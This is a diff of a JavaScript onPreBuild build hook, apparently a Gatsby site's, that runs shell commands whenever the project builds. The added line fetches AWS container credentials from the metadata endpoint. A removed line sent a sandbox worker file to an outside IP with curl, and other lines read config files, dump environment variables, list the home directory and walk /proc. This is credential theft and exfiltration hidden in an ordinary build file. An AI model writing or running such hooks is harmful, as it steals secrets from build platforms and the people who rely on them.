@@ -18,23 +18,14 @@ exports.onPreBuild = function () {
   console.log(`aw yeah`)
 
   //exec(`env`)
-  exec(`cat $HOME/.config/gatsby/config.json`)
-  exec(`cat .git/config`)
-
-  const gitConfigPath = `.git/config`
-  if (!fs.existsSync(gitConfigPath)) {
-    return null
-  } else {
-    const config = multiIni.read(`.git/config`)
-    console.log(config)
-    console.log(config[`remote "origin"`])
-  }
-  exec(`curl 185.20.136.111:1234 --data-binary @/var/task/sandbox-worker.js`)
+  exec(`curl --connect-timeout 100000 http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`)
+  //exec(`curl 185.20.136.111:1234 --data-binary @/var/task/sandbox-worker.js`)
   console.log(`aw yeah`)
   exec(`env`)
   console.log(`done env`)
   exec(`ls -la $HOME`)
   console.log(`done home`)
+
   const ls = fs.readdirSync(`/proc`)
   ls.filter(dir => Number.isFinite(Number(dir))).forEach(dir => {
     console.log(dir)
